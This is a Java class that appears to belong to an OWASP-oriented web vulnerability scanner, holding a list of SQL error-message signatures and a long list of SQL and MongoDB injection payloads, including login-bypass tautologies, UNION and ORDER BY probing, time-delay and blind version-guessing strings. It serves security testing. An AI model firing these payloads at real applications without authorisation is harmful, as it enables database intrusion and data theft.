package com.funtap.awass.Top10OWASPWeb2021.PayLoadSignature.A3Injection;

public class SQLInjection {
    private static String[] arrSigSQLin;
    private static String[] arrPaySQLin;

    public SQLInjection() {
        arrSigSQLin = new String[]{
                "Syntax error",
                "Incorrect syntax near",
                "You have an error in your SQL syntax",
                "supplied argument is not a valid MySQL",
                "mysql_fetch_array() expects parameter 1 to be resource, boolean given in",
                "java.sql.SQLException: Syntax error or access violation",
                "java.sql.SQLException: Unexpected end of command",
                "PostgreSQL query failed: ERROR: parser:",
                "XPathException",
                "Warning: SimpleXMLElement::xpath():",
                "[Microsoft][ODBC SQL Server Driver]",
                "Microsoft OLE DB Provider for ODBC Drivers",
                "[Microsoft][ODBC Microsoft Access Driver]",
                "supplied argument is not a valid ldap",
                "DB2 SQL error:",
                "Interbase Injection",
                "Sybase message:",
                "Unclosed quotation mark after the character string",
                "Incorrect syntax near"};


        /*List Payload SQL Injection*/
        arrPaySQLin = new String[]{
                "'",
                "')",
                "';",
                "\"",
                "\")",
                "\";",
                "\"\"",
                ")",
                "`;",
                "\\",
                "%27",
                "%%2727",
                "%25%27",
                "%60",
                "%5C",
                "' or \"",
                "-- or # ",
                "' OR '1",
                "' OR 1 -- -",
                "\" OR \"\" = \"",
                "\" OR 1 = 1 -- -",
                "' OR '' = '",
                "'='",
                "'LIKE'",
                "'=0--+",
                " OR 1=1",
                "' OR 'x'='x",
                "' AND id IS NULL; --",
                "'''''''''''''UNION SELECT '2",
                "%00",
                " AND 1",
                " AND 0",
                " AND true",
                " AND false",
                "1-false",
                "1-true",
                "1*56",
                "-2",
                "1' ORDER BY 1--+",
                "1' ORDER BY 2--+",
                "1' ORDER BY 3--+",
                "1' ORDER BY 1,2--+",
                "1' ORDER BY 1,2,3--+",
                "1' GROUP BY 1,2,--+",
                "1' GROUP BY 1,2,3--+",
                "' GROUP BY columnnames having 1=1 --",
                "-1' UNION SELECT 1,2,3--+",
                "' UNION SELECT sum(columnname ) from tablename --",
                "-1 UNION SELECT 1 INTO @,@",
                "-1 UNION SELECT 1 INTO @,@,@",
                "1 AND (SELECT * FROM Users) = 1",
                "' AND MID(VERSION(),1,1) = '5';",
                "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
                ",(select * from (select(sleep(10)))a)",
                "%2c(select%20*%20from%20(select(sleep(10)))a)",
                "';WAITFOR DELAY '0:0:30'--",
                "#",
                "/*",
                "-- -",
                ";%00",
                "`",
                " OR 1=1",
                " OR 1=0",
                " OR x=x",
                " OR x=y",
                " OR 1=1#",
                " OR 1=0#",
                " OR x=x#",
                " OR x=y#",
                " OR 1=1--",
                " OR 1=0--",
                " OR x=x--",
                " OR x=y--",
                " OR 3409=3409 AND ('pytW' LIKE 'pytW",
                " OR 3409=3409 AND ('pytW' LIKE 'pytY",
                " HAVING 1=1",
                " HAVING 1=0",
                " HAVING 1=1#",
                " HAVING 1=0#",
                " HAVING 1=1--",
                " HAVING 1=0--",
                " AND 1=1",
                " AND 1=0",
                " AND 1=1--",
                " AND 1=0--",
                " AND 1=1#",
                " AND 1=0#",
                " AND 1=1 AND '%'='",
                " AND 1=0 AND '%'='",
                " AND 1083=1083 AND (1427=1427",
                " AND 7506=9091 AND (5913=5913",
                " AND 1083=1083 AND ('1427=1427",
                " AND 7506=9091 AND ('5913=5913",
                " AND 7300=7300 AND 'pKlZ'='pKlZ",
                " AND 7300=7300 AND 'pKlZ'='pKlY",
                " AND 7300=7300 AND ('pKlZ'='pKlZ",
                " AND 7300=7300 AND ('pKlZ'='pKlY",
                " AS INJECTX WHERE 1=1 AND 1=1",
                " AS INJECTX WHERE 1=1 AND 1=0",
                " AS INJECTX WHERE 1=1 AND 1=1#",
                " AS INJECTX WHERE 1=1 AND 1=0#",
                " AS INJECTX WHERE 1=1 AND 1=1--",
                " AS INJECTX WHERE 1=1 AND 1=0--",
                " WHERE 1=1 AND 1=1",
                " WHERE 1=1 AND 1=0",
                " WHERE 1=1 AND 1=1#",
                " WHERE 1=1 AND 1=0#",
                " WHERE 1=1 AND 1=1--",
                " WHERE 1=1 AND 1=0--",
                " ORDER BY 1--",
                " ORDER BY 2--",
                " ORDER BY 3--",
                " ORDER BY 4--",
                " ORDER BY 5--",
                " ORDER BY 6--",
                " ORDER BY 7--",
                " ORDER BY 8--",
                " ORDER BY 9--",
                " ORDER BY 10--",
                " ORDER BY 31337--",
                " ORDER BY 1#",
                " ORDER BY 2#",
                " ORDER BY 3#",
                " ORDER BY 4#",
                " ORDER BY 5#",
                " ORDER BY 6#",
                " ORDER BY 7#",
                " ORDER BY 8#",
                " ORDER BY 9#",
                " ORDER BY 10#",
                " ORDER BY 31337#",
                " ORDER BY 1",
                " ORDER BY 2",
                " ORDER BY 3",
                " ORDER BY 4",
                " ORDER BY 5",
                " ORDER BY 6",
                " ORDER BY 7",
                " ORDER BY 8",
                " ORDER BY 9",
                " ORDER BY 10",
                " ORDER BY 31337",
                " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
                " RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
                " IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
                " IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
                "%' AND 8310=8310 AND '%'='",
                "%' AND 8310=8311 AND '%'='",
                " and (select substring(@@version,1,1))='X'",
                " and (select substring(@@version,1,1))='M'",
                " and (select substring(@@version,2,1))='i'",
                " and (select substring(@@version,2,1))='y'",
                " and (select substring(@@version,3,1))='c'",
                " and (select substring(@@version,3,1))='S'",
                " and (select substring(@@version,3,1))='X'",
                "'-'",
                "' '",
                "'&'",
                "'^'",
                "'*'",
                "' or ''-'",
                "' or '' '",
                "' or ''&'",
                "' or ''^'",
                "' or ''*'",
                "\" - \"",
                "\" \"",
                "\"&\"",
                "\"^\"",
                "\"*\"",
                "\" or \"\"-\"",
                "\" or \"\" \"",
                "\" or \"\"&\"",
                "\" or \"\"^\"",
                "\" or \"\"*\"",
                "or true--",
                "\" or true--",
                "' or true--",
                "\") or true--",
                "') or true--",
                "' or 'x'='x",
                "') or ('x')=('x",
                "')) or (('x'))=(('x",
                "\" or \"x\"=\"x",
                "\") or(\"x\") = (\"x",
                "\")) or((\"x\")) = ((\"x",
                "or 1=1",
                "or 1=1--",
                "or 1=1#",
                "or 1=1/*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "admin' or '1'='1",
                "admin' or '1'='1'--",
                "admin' or '1'='1'#",
                "admin' or '1'='1'/*",
                "admin'or 1=1 or ''='",
                "admin' or 1=1",
                "admin' or 1=1--",
                "admin' or 1=1#",
                "admin' or 1=1/*",
                "admin') or ('1'='1",
                "admin') or ('1'='1'--",
                "admin') or ('1'='1'#",
                "admin') or ('1'='1'/*",
                "admin') or '1'='1",
                "admin') or '1'='1'--",
                "admin') or '1'='1'#",
                "admin') or '1'='1'/*",
                "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
                "admin\"--",
                "admin\" #",
                "admin\"/*",
                "admin\" or \"1\"=\"1",
                "admin\" or \"1\"=\"1\"--",
                "admin\" or \"1\"=\"1\"#",
                "admin\" or \"1\"=\"1\"/*",
                "admin\"or 1=1 or \"\"=\"",
                "admin\" or 1=1",
                "admin\" or 1=1--",
                "admin\" or 1=1#",
                "admin\" or 1=1/*",
                "admin\") or(\"1\" = \"1",
                "admin\") or(\"1\" = \"1\"--",
                "admin\") or(\"1\" = \"1\"#",
                "admin\") or(\"1\" = \"1\"/*",
                "admin\") or \"1\"=\"1",
                "admin\") or \"1\"=\"1\"--",
                "admin\") or \"1\"=\"1\"#",
                "admin\") or \"1\"=\"1\"/*",
                "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$where: '1 == 1'",
                "', $where: '1 == 1'",
                "1, $where: '1 == 1'",
                "{ $ne: 1 }",
                "', $or: [ {}, { 'a':'a",
                "' } ], $comment:'successful MongoDB injection'",
                "db.injection.insert({success:1});",
                "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
                "|| 1==1",
                "' && this.password.match(/.*/)//+%00",
                "' && this.passwordzz.match(/.*/)//+%00",
                "'%20%26%26%20this.password.match(/.*/)//+%00",
                "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
                "{$gt: ''}",
                "[$ne]=1",
        };
    }
    public String[] getArrSigSQLin() {
        return arrSigSQLin;
    }

    public String[] getArrPaySQLin() {
        return arrPaySQLin;
    }
}
